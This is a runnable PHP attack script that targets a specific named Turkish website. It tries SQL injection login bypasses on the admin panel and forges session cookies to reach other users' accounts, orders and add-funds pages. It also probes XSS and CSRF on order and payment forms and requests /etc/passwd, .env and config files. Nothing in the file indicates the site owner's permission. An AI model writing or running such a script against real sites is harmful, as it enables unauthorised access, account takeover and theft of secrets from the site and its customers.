<?php
/**
 * Comprehensive Web Application Attack
 * Target: https://royzasmm.com.tr/
 * Methods: SQL Injection, Session Hijacking, CSRF, XSS
 */

class ComprehensiveAttack {
    private $target = "https://royzasmm.com.tr";
    private $adminUrl = "https://royzasmm.com.tr/admin/";
    private $userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
    
    // Attack vectors
    private $sqlInjectionPayloads = [
        "admin' OR 1=1--",
        "admin' OR '1'='1'--",
        "admin' OR 1=1#",
        "admin' OR '1'='1'#",
        "admin' OR 1=1/*",
        "' OR 1=1--",
        "' OR '1'='1'--"
    ];
    
    private $xssPayloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<svg onload=alert('XSS')>",
        "'\"><script>alert('XSS')</script>"
    ];
    
    private $csrfPayloads = [
        "categories=1&services=1&link=test&quantity=100",
        "amount=1000&payment_method=card",
        "username=test&email=test@test.com"
    ];
    
    public function runAllAttacks() {
        echo "=== COMPREHENSIVE WEB APPLICATION ATTACK ===\n";
        echo "Target: {$this->target}\n";
        echo "Time: " . date('Y-m-d H:i:s') . "\n\n";
        
        $this->testSQLInjection();
        $this->testSessionHijacking();
        $this->testXSS();
        $this->testCSRF();
        $this->testDirectoryTraversal();
        $this->testInformationDisclosure();
    }
    
    public function testSQLInjection() {
        echo "=== SQL INJECTION TEST ===\n";
        
        foreach ($this->sqlInjectionPayloads as $index => $payload) {
            echo "Test " . ($index + 1) . ": {$payload}\n";
            
            $data = "username=" . urlencode($payload) . "&password=test&remember=1";
            $response = $this->sendPostRequest($this->adminUrl, $data);
            
            $this->analyzeSQLInjection($response, $payload);
            echo "----------------------------------------\n";
            sleep(1);
        }
    }
    
    public function testSessionHijacking() {
        echo "\n=== SESSION HIJACKING TEST ===\n";
        
        $userIds = [1, 2, 3, 4, 5];
        $endpoints = ['/dashboard', '/orders', '/account', '/addfunds'];
        
        foreach ($userIds as $userId) {
            echo "Testing User ID: {$userId}\n";
            
            $cookies = [
                "PHPSESSID=0dd217dff888e74d1d28eee839336307",
                "u_id={$userId}",
                "u_loginok=1"
            ];
            
            foreach ($endpoints as $endpoint) {
                $response = $this->sendGetRequest($this->target . $endpoint, $cookies);
                $this->analyzeSessionHijacking($response, $endpoint, $userId);
            }
            echo "----------------------------------------\n";
        }
    }
    
    public function testXSS() {
        echo "\n=== XSS TEST ===\n";
        
        $endpoints = ['/search', '/neworder', '/contact'];
        
        foreach ($this->xssPayloads as $index => $payload) {
            echo "XSS Payload " . ($index + 1) . ": {$payload}\n";
            
            foreach ($endpoints as $endpoint) {
                $data = "q=" . urlencode($payload);
                $response = $this->sendPostRequest($this->target . $endpoint, $data);
                
                if (strpos($response['body'], $payload) !== false) {
                    echo "  ✅ XSS Found: {$endpoint}\n";
                } else {
                    echo "  ❌ XSS Not Found: {$endpoint}\n";
                }
            }
            echo "----------------------------------------\n";
        }
    }
    
    public function testCSRF() {
        echo "\n=== CSRF TEST ===\n";
        
        $endpoints = ['/neworder', '/addfunds', '/account'];
        
        foreach ($this->csrfPayloads as $index => $payload) {
            echo "CSRF Test " . ($index + 1) . ": {$payload}\n";
            
            foreach ($endpoints as $endpoint) {
                $response = $this->sendPostRequest($this->target . $endpoint, $payload);
                
                if (strpos($response['body'], 'csrf') !== false || strpos($response['body'], 'token') !== false) {
                    echo "  ✅ CSRF Protection: {$endpoint}\n";
                } else {
                    echo "  ❌ CSRF Vulnerable: {$endpoint}\n";
                }
            }
            echo "----------------------------------------\n";
        }
    }
    
    public function testDirectoryTraversal() {
        echo "\n=== DIRECTORY TRAVERSAL TEST ===\n";
        
        $paths = [
            '../../../etc/passwd',
            '../../admin',
            '../admin',
            'admin',
            'admin.php',
            'config.php',
            '.env'
        ];
        
        foreach ($paths as $path) {
            echo "Testing: {$path}\n";
            
            $response = $this->sendGetRequest($this->target . '/' . $path);
            
            if ($response['http_code'] === 200) {
                echo "  ✅ Path Accessible: {$path}\n";
            } elseif ($response['http_code'] === 403) {
                echo "  ⚠️ Access Denied: {$path}\n";
            } else {
                echo "  ❌ Not Found: {$path}\n";
            }
        }
    }
    
    public function testInformationDisclosure() {
        echo "\n=== INFORMATION DISCLOSURE TEST ===\n";
        
        $files = ['robots.txt', '.htaccess', 'phpinfo.php', 'info.php'];
        
        foreach ($files as $file) {
            echo "Testing: {$file}\n";
            
            $response = $this->sendGetRequest($this->target . '/' . $file);
            
            if ($response['http_code'] === 200) {
                echo "  ✅ File Accessible: {$file}\n";
                
                // Check for sensitive information
                if (strpos($response['body'], 'version') !== false) {
                    echo "    ⚠️ Version Information Found!\n";
                }
                if (strpos($response['body'], 'error') !== false) {
                    echo "    ⚠️ Error Information Found!\n";
                }
            } else {
                echo "  ❌ File Not Found: {$file}\n";
            }
        }
    }
    
    private function sendPostRequest($url, $data) {
        $ch = curl_init();
        
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $data,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_USERAGENT => $this->userAgent,
            CURLOPT_HTTPHEADER => [
                'Content-Type: application/x-www-form-urlencoded',
                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language: en-US,en;q=0.5',
                'Accept-Encoding: gzip, deflate',
                'Connection: keep-alive'
            ],
            CURLOPT_TIMEOUT => 30,
            CURLOPT_SSL_VERIFYPEER => false
        ]);
        
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        return [
            'body' => $response,
            'http_code' => $httpCode
        ];
    }
    
    private function sendGetRequest($url, $cookies = []) {
        $ch = curl_init();
        
        $headers = [
            'User-Agent: ' . $this->userAgent,
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language: en-US,en;q=0.5',
            'Accept-Encoding: gzip, deflate',
            'Connection: keep-alive'
        ];
        
        if (!empty($cookies)) {
            $headers[] = 'Cookie: ' . implode('; ', $cookies);
        }
        
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_HTTPHEADER => $headers,
            CURLOPT_TIMEOUT => 30,
            CURLOPT_SSL_VERIFYPEER => false
        ]);
        
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        return [
            'body' => $response,
            'http_code' => $httpCode
        ];
    }
    
    private function analyzeSQLInjection($response, $payload) {
        $body = $response['body'];
        $httpCode = $response['http_code'];
        
        echo "  HTTP Code: {$httpCode}\n";
        
        if (strpos($body, "username you entered was found") !== false) {
            echo "  ✅ SQL Injection: Username found!\n";
        }
        
        if (strpos($body, "admin") !== false || strpos($body, "dashboard") !== false) {
            echo "  ✅ Admin Access: Admin panelə giriş mümkündür!\n";
        }
        
        if (strpos($body, "error") !== false) {
            echo "  ⚠️ Error: Database xətası tapıldı!\n";
        }
        
        echo "  Response Length: " . strlen($body) . " bytes\n";
    }
    
    private function analyzeSessionHijacking($response, $endpoint, $userId) {
        $body = $response['body'];
        $httpCode = $response['http_code'];
        
        if ($httpCode === 200) {
            echo "  ✅ Access: User ID {$userId} {$endpoint} səhifəsinə giriş edə bilər!\n";
        } else {
            echo "  ❌ Access Denied: User ID {$userId} {$endpoint} səhifəsinə giriş edə bilməz!\n";
        }
    }
}

// Usage
if (php_sapi_name() === 'cli') {
    $attack = new ComprehensiveAttack();
    $attack->runAllAttacks();
} else {
    echo "Bu script terminal-də işlədilməlidir!";
}
?>